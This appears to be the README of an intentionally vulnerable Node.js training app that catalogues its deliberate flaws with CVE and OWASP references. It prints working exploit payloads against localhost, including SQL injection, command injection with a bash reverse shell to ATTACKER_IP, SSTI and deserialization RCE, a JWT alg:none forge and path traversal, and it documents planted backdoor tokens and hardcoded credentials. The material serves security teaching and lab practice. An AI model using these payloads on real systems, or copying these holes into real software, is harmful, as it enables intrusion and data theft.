# vul-app-01 — Intentionally Vulnerable Node.js Application

> ⚠️ **WARNING: This application contains real, exploitable vulnerabilities by design.**
> It is intended exclusively for **security education, CTF challenges, and penetration testing practice**
> in isolated lab environments. **Never deploy this on a public network or production server.**

---

## Overview

`vul-app-01` is a deliberately insecure Express.js web server that demonstrates over **30 distinct security
vulnerabilities** mapped to real CVEs and OWASP Top 10 categories. Every vulnerability is annotated in source
code with the relevant identifier so learners can trace the exploit path from payload to impact.

## Quick Start

```bash
# Install dependencies (note: pinned to vulnerable versions)
npm install

# Start the server
npm start
# → http://localhost:3000
```

---

## Vulnerability Catalogue

### 1. CVE-Referenced Package Vulnerabilities (`package.json`)

| Package | Pinned Version | CVE | Vulnerability |
|---|---|---|---|
| `lodash` | 4.17.4 | CVE-2019-10744 | Prototype Pollution via `merge`/`set`/`zipObjectDeep` |
| `jsonwebtoken` | 7.4.3 | CVE-2015-9235 | Algorithm confusion — accepts `alg: none` without signature |
| `node-serialize` | 0.0.4 | CVE-2017-5941 | Remote Code Execution via IIFE in serialised object |
| `ejs` | 3.1.6 | CVE-2022-29078 | SSTI → RCE via `outputFunctionName` option injection |
| `axios` | 0.21.1 | CVE-2021-3749 | ReDoS via crafted URL |
| `marked` | 0.3.6 | CVE-2022-21681 | ReDoS via malformed markdown |
| `multer` | 1.4.2 | CVE-2022-24434 | Denial of Service |
| `serialize-javascript` | 1.7.0 | CVE-2020-7660 | XSS via unsafe serialization of regex/functions |

---

### 2. Authentication & Authorization Flaws

#### VULN-AUTH-01 — Hardcoded Credentials
**File:** [`routes/auth.js`](routes/auth.js) · **OWASP:** A07:2021
```
Username: admin
Password: admin123
```

#### VULN-AUTH-02 — JWT with No Expiry
**File:** [`routes/auth.js`](routes/auth.js)
```bash
# Token never expires — valid indefinitely
POST /api/auth/login  {"username":"admin","password":"admin123"}
```

#### VULN-AUTH-03 — JWT `alg:none` Bypass (CVE-2015-9235)
**File:** [`routes/auth.js`](routes/auth.js)
```bash
# Forge a JWT with no signature
HEADER=$(echo -n '{"alg":"none"}' | base64 | tr -d '=')
PAYLOAD=$(echo -n '{"id":1,"username":"admin","role":"admin"}' | base64 | tr -d '=')
TOKEN="${HEADER}.${PAYLOAD}."   # empty signature

curl http://localhost:3000/api/auth/jwt-none \
  -H "Authorization: Bearer ${TOKEN}"
```

#### VULN-AUTH-04 — Mass Assignment (Self-Elevation to Admin)
**File:** [`routes/auth.js`](routes/auth.js) · **OWASP:** A04:2021
```bash
# Register as admin by injecting the role field
curl -X POST http://localhost:3000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"p4ss","email":"x@x.com","role":"admin","balance":999999}'
```

#### VULN-USER-01 — BOLA / IDOR (Broken Object Level Authorization)
**File:** [`routes/users.js`](routes/users.js) · **OWASP:** API3:2023
```bash
# Retrieve admin's password, SSN, and credit card without authentication
curl http://localhost:3000/api/users/1
```

#### VULN-ADMIN-02 — Hardcoded Backdoor Token
**File:** [`routes/admin.js`](routes/admin.js)
```bash
# Always-valid backdoor token — bypasses all auth
curl http://localhost:3000/api/admin/users \
  -H "Authorization: Bearer backdoor-token-admin"

# Alternative: hardcoded API key in query string
curl "http://localhost:3000/api/admin/users?api_key=admin-api-key-12345"
```

---

### 3. Injection Vulnerabilities

#### VULN-INJ-01 — SQL Injection
**File:** [`routes/injection.js`](routes/injection.js) · **OWASP:** A03:2021 · CWE-89
```bash
# Authentication bypass
curl "http://localhost:3000/api/injection/sql?username=%27+OR+%271%27%3D%271%27--&password=x"

# UNION-based data exfiltration (dump all passwords)
curl "http://localhost:3000/api/injection/sql-search?q=%25%27+UNION+SELECT+username%2Cpassword%2Cssn%2Ccredit_card%2Capi_key%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL+FROM+users--"
```

#### VULN-INJ-02 — Command Injection (RCE)
**File:** [`routes/injection.js`](routes/injection.js) · **OWASP:** A03:2021 · CWE-78
```bash
# Read /etc/passwd
curl -X POST http://localhost:3000/api/injection/cmd \
  -H "Content-Type: application/json" \
  -d '{"host": "127.0.0.1; cat /etc/passwd"}'

# Reverse shell
curl -X POST http://localhost:3000/api/injection/cmd \
  -H "Content-Type: application/json" \
  -d '{"host": "x; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"}'
```

#### VULN-TMPL-01 — EJS Server-Side Template Injection → RCE (CVE-2022-29078)
**File:** [`routes/templates.js`](routes/templates.js) · CWE-94
```bash
# Proof-of-concept (executes system command)
curl -X POST http://localhost:3000/api/template/render \
  -H "Content-Type: application/json" \
  -d '{
    "template": "<p>Hello</p>",
    "options": {
      "outputFunctionName": "x;process.mainModule.require('"'"'child_process'"'"').execSync('"'"'id'"'"').toString();//"
    }
  }'
```

#### VULN-DESER-01 — node-serialize RCE (CVE-2017-5941)
**File:** [`routes/deserialization.js`](routes/deserialization.js) · OWASP A08:2021
```bash
# IIFE payload — executes `id` and writes output to /tmp/pwned
curl -X POST http://localhost:3000/api/deserialize \
  -H "Content-Type: application/json" \
  -d '{"rce":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"id\",function(e,o){require(\"fs\").writeFileSync(\"/tmp/pwned\",o)});}()"}'
```

#### VULN-DESER-03 — eval() RCE
**File:** [`routes/deserialization.js`](routes/deserialization.js) · CWE-95
```bash
curl -X POST http://localhost:3000/api/deserialize/eval \
  -H "Content-Type: application/json" \
  -d '{"expression": "require('"'"'child_process'"'"').execSync('"'"'id'"'"').toString()"}'
```

#### VULN-INJ-03 — Prototype Pollution (CVE-2019-10744)
**File:** [`app.js`](app.js) · lodash 4.17.4
```bash
# Pollute Object.prototype.admin → all object instances gain .admin = true
curl -X POST http://localhost:3000/api/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"admin": true, "isVip": true}}'
```

---

### 4. File & Path Vulnerabilities

#### VULN-FILE-01 — Directory Traversal
**File:** [`routes/files.js`](routes/files.js) · CWE-22 · OWASP A01:2021
```bash
# Read /etc/passwd
curl "http://localhost:3000/api/files/read?file=../../../../etc/passwd"

# Read Node.js process environment
curl "http://localhost:3000/api/files/read?file=../../../../proc/self/environ"

# Read the application source
curl "http://localhost:3000/api/files/read?file=../../app.js"
```

#### VULN-FILE-02 — Unrestricted File Upload + VULN-FILE-03 — RCE
**File:** [`routes/files.js`](routes/files.js) · CWE-434
```bash
# Step 1: upload a Node.js reverse shell
echo 'module.exports = require("child_process").execSync("id").toString()' > shell.js
curl -X POST http://localhost:3000/api/files/upload \
  -F "file=@shell.js"

# Step 2: execute it
curl "http://localhost:3000/api/files/execute?file=shell.js"
```

---

### 5. Security Misconfiguration

| ID | Location | Issue |
|---|---|---|
| VULN-01 | [`app.js`](app.js) | `CORS origin: '*' + credentials: true` — allows cross-origin credentialed requests |
| VULN-02 | [`app.js`](app.js) | No security headers — missing CSP, HSTS, X-Frame-Options, X-Content-Type-Options |
| VULN-03 | [`app.js`](app.js) | Morgan logs full Authorization headers and query strings |
| VULN-04 | [`app.js`](app.js) | Session cookie `httpOnly: false`, `sameSite: false` — XSS/CSRF risk |
| VULN-05 | [`app.js`](app.js) | `env: 'development'` in production — enables verbose stack traces |
| VULN-06 | [`app.js`](app.js) | All secrets hardcoded in `app.locals.config` |
| VULN-07 | [`app.js`](app.js) | `GET /api/config` dumps all secrets + `process.env` unauthenticated |
| VULN-08 | [`app.js`](app.js) | `GET /api/health` exposes PID, memory stats, database path |
| VULN-10 | [`app.js`](app.js) | Global error handler returns full stack trace + secrets to client |

```bash
# Dump all secrets, env vars, and configuration
curl http://localhost:3000/api/config

# Full route enumeration
curl http://localhost:3000/api/debug/routes

# Dump all environment variables
curl http://localhost:3000/api/debug/env
```

---

### 6. DevOps / CI/CD Vulnerabilities

| File | ID | Vulnerability |
|---|---|---|
| [`Dockerfile`](Dockerfile) | VULN-DOCKER-01 | Runs as `root` inside container |
| [`Dockerfile`](Dockerfile) | VULN-DOCKER-02 | Base image `node:14-alpine` — EOL, known CVEs |
| [`Dockerfile`](Dockerfile) | VULN-DOCKER-03 | Secrets baked into image via `ENV` — visible in `docker inspect` |
| [`Dockerfile`](Dockerfile) | VULN-DOCKER-04 | `.git` history copied into image |
| [`docker-compose.yml`](docker-compose.yml) | VULN-COMPOSE-01 | Plaintext secrets in compose file |
| [`docker-compose.yml`](docker-compose.yml) | VULN-COMPOSE-02 | Database admin UI bound to `0.0.0.0:8080` |
| [`docker-compose.yml`](docker-compose.yml) | VULN-COMPOSE-05 | `privileged: true` — full host kernel access |
| [`docker-compose.yml`](docker-compose.yml) | VULN-COMPOSE-04 | Host `/` mounted read-write into container |
| [`.github/workflows/ci.yml`](.github/workflows/ci.yml) | VULN-CI-01 | Secrets printed to CI build logs |
| [`.github/workflows/ci.yml`](.github/workflows/ci.yml) | VULN-CI-03 | `curl ... \| sh` — unverified script execution |
| [`.github/workflows/ci.yml`](.github/workflows/ci.yml) | VULN-CI-05 | SSH private key echoed to logs |
| [`.github/workflows/ci.yml`](.github/workflows/ci.yml) | VULN-CI-06 | `npm install --legacy-peer-deps` bypasses `npm audit` |
| [`env.example`](env.example) | VULN-ENV-01 | Secrets in `.env` file committed to version control |
| [`db/setup.js`](db/setup.js) | VULN-DB-01 | `verbose: console.log` — all SQL queries with data logged |
| [`db/setup.js`](db/setup.js) | VULN-DB-02 | Passwords stored as plaintext |
| [`db/setup.js`](db/setup.js) | VULN-DB-03 | SSN and credit card in same table as auth data |

---

## File Structure

```
vul-app-01/
├── app.js                          # Main entry — CORS bypass, no headers, config dump
├── package.json                    # Pinned vulnerable dependency versions + CVE index
├── Dockerfile                      # Root container, secrets in ENV, .git copied
├── docker-compose.yml              # Privileged container, host mount, exposed DB
├── env.example                     # Simulates .env committed to repo
├── gitignore.example               # Shows what .gitignore is missing
├── .github/
│   └── workflows/
│       └── ci.yml                  # Insecure CI/CD — secrets in logs, curl|sh
├── db/
│   └── setup.js                    # SQLite init, verbose logging, plaintext passwords
├── routes/
│   ├── auth.js                     # Hardcoded creds, JWT alg:none, mass assignment
│   ├── users.js                    # BOLA/IDOR, mass assignment, SQLi
│   ├── admin.js                    # No auth, backdoor token, full PII dump
│   ├── injection.js                # SQLi, CMDi, NoSQL injection, header injection
│   ├── files.js                    # Directory traversal, unrestricted upload, RCE
│   ├── templates.js                # EJS SSTI (CVE-2022-29078), DOM XSS
│   ├── deserialization.js          # node-serialize RCE (CVE-2017-5941), eval()
│   └── debug.js                    # Route dump, env dump, dynamic require()
└── public/
    └── index.html                  # DOM XSS, no CSP, external scripts without SRI
```

---

## OWASP Top 10 Coverage

| Category | Vulnerabilities Covered |
|---|---|
| A01 — Broken Access Control | BOLA/IDOR, directory traversal, admin endpoints without auth, IDOR on delete |
| A02 — Cryptographic Failures | Plaintext passwords, hardcoded secrets, JWT without expiry, weak session secret |
| A03 — Injection | SQL injection, command injection, SSTI, header injection, prototype pollution |
| A04 — Insecure Design | Mass assignment, no rate limiting, unrestricted file upload, eval() endpoint |
| A05 — Security Misconfiguration | No security headers, CORS wildcard+credentials, debug mode, verbose error handler |
| A06 — Vulnerable & Outdated Components | 8 packages with published CVEs pinned in package.json |
| A07 — Identification & Auth Failures | Hardcoded creds, JWT alg:none, no token expiry, session flags disabled |
| A08 — Software & Data Integrity | node-serialize RCE, eval(), dynamic require(), npm --legacy-peer-deps |
| A09 — Security Logging & Monitoring | Auth headers logged by Morgan, SQL data logged by verbose DB, no audit trail |
| A10 — SSRF | (exercises left to learner — base is present via axios dependency) |

---

## Legal Notice

This software is provided solely for **lawful security education** and must only be used:
- On systems you own or have explicit written authorisation to test
- In isolated lab / VM environments with no internet exposure
- For CTF challenges, developer security training, and AppSec courses

Deploying this application on any publicly accessible server or testing it against systems you do not own
is **illegal** and may violate computer fraud laws in your jurisdiction.
